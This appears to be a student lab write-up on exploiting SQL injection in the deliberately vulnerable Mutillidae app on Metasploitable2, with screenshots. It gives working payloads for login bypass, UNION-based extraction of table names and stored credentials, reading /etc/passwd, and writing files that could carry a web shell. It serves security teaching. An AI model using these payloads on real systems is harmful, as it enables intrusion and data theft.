# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![Screenshot 2024-04-28 224449](https://github.com/Narasimhan05/sqlinjection/assets/132819871/778461cc-0803-438a-8795-ecc11d932061)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser. 
![Screenshot 2024-04-28 224454](https://github.com/Narasimhan05/sqlinjection/assets/132819871/19e9ab15-0d13-44a3-bbf1-76397f80e406)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![Screenshot 2024-04-28 224437](https://github.com/Narasimhan05/sqlinjection/assets/132819871/21b85a76-a006-4edf-ae93-b1803d0408f2)

Click on the menu Login/Register and register for an account
![Screenshot 2024-04-28 224442](https://github.com/Narasimhan05/sqlinjection/assets/132819871/3005b498-8e87-4587-b1fb-f80e99069f04)

Click on the link “Please register here”
![Screenshot 2024-04-28 224430](https://github.com/Narasimhan05/sqlinjection/assets/132819871/8f33f1bb-c10c-40fa-91d9-0952998c6806)

Click on “Create Account” to display the following page:
![Screenshot 2024-04-28 224425](https://github.com/Narasimhan05/sqlinjection/assets/132819871/9f93cbbd-eac2-4bcf-bc50-68bb7bbb07c9)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![Screenshot 2024-04-28 224420](https://github.com/Narasimhan05/sqlinjection/assets/132819871/399fbbc6-9229-4f99-be87-2fd8afa2f447)

Click “Login”. The logged in page will show as below:
![Screenshot 2024-04-28 224416](https://github.com/Narasimhan05/sqlinjection/assets/132819871/eddcefac-c572-425e-a8a2-fde5d8354f9d)

##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![Screenshot 2024-04-28 224408](https://github.com/Narasimhan05/sqlinjection/assets/132819871/63ddcfc4-3146-4d3d-bf69-6f41724783fd)

Click the login button and you will see it enter into the administrator page.
![Screenshot 2024-04-28 224403](https://github.com/Narasimhan05/sqlinjection/assets/132819871/eb2e344c-c218-46d0-8fc9-1f50adfe52fe)

Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: img

![Screenshot 2024-04-28 224358](https://github.com/Narasimhan05/sqlinjection/assets/132819871/72e80f17-a69e-4683-99f8-9631bde7031d)
![Screenshot 2024-04-28 224354](https://github.com/Narasimhan05/sqlinjection/assets/132819871/cdc7c92f-e9f3-48f7-bfa2-39e12471b70b)
![Screenshot 2024-04-28 224349](https://github.com/Narasimhan05/sqlinjection/assets/132819871/a239726d-47cd-4341-9d58-672dffb42e39)
![Screenshot 2024-04-28 224342](https://github.com/Narasimhan05/sqlinjection/assets/132819871/2a75f86f-8864-46f5-87c3-d79c5bfd9bae)
![Screenshot 2024-04-28 224337](https://github.com/Narasimhan05/sqlinjection/assets/132819871/f096cd0b-0a61-4e8e-a59d-21c7b5d5ea69)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![Screenshot 2024-04-28 224318](https://github.com/Narasimhan05/sqlinjection/assets/132819871/bba70e25-f771-4809-a1a7-859466a5b599)
![Screenshot 2024-04-28 224313](https://github.com/Narasimhan05/sqlinjection/assets/132819871/b225b375-9a58-428e-83d6-e8ea7073bb1e)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details


After adding the order by 6 into the existing url , the following error statement will be obtained:

![Screenshot 2024-04-28 224307](https://github.com/Narasimhan05/sqlinjection/assets/132819871/75760f80-92cd-4839-945b-df252095d9c5)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![Screenshot 2024-04-28 224302](https://github.com/Narasimhan05/sqlinjection/assets/132819871/0a1ebd33-f44a-4224-8dac-68c04c59ff8d)

As it is having 5 columns the query worked fine and it provides the correct result
![Screenshot 2024-04-28 224252](https://github.com/Narasimhan05/sqlinjection/assets/132819871/05660912-ffbe-464b-ad9f-1c78c1a53f8d)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![Screenshot 2024-04-28 224244](https://github.com/Narasimhan05/sqlinjection/assets/132819871/28d49bb1-1e31-4db5-a1ea-808a3663dbad)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![Screenshot 2024-04-28 224240](https://github.com/Narasimhan05/sqlinjection/assets/132819871/f0ef1ee6-8060-457f-87af-9b4b606bb8d7)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![Screenshot 2024-04-28 224234](https://github.com/Narasimhan05/sqlinjection/assets/132819871/991f71ad-33bb-4cfb-b8da-3a778259bcb0)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![Screenshot 2024-04-28 224229](https://github.com/Narasimhan05/sqlinjection/assets/132819871/104e1530-9a9d-4fd7-92df-2b143331e1d1)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

The column names of the accounts is displayed below for the following url:
![Screenshot 2024-04-28 224224](https://github.com/Narasimhan05/sqlinjection/assets/132819871/86dda9ec-9c81-410f-900b-6270d292d817)

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![Screenshot 2024-04-28 224220](https://github.com/Narasimhan05/sqlinjection/assets/132819871/3b9b5de0-8249-4fc1-a92d-5a83d5e4ba16)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![Screenshot 2024-04-28 224205](https://github.com/Narasimhan05/sqlinjection/assets/132819871/8fc0e551-97f6-47da-a7dd-4218bbbdefaa)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![Screenshot 2024-04-28 224158](https://github.com/Narasimhan05/sqlinjection/assets/132819871/42bf6eb5-993a-4260-95e2-7a585a525b96)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![Screenshot 2024-04-28 224152](https://github.com/Narasimhan05/sqlinjection/assets/132819871/0f23cd30-7374-483c-b9b5-85f3d3984ed6)

Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![Screenshot 2024-04-28 224144](https://github.com/Narasimhan05/sqlinjection/assets/132819871/f3c32031-7fa7-4089-bdfb-a9726391c4f8)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
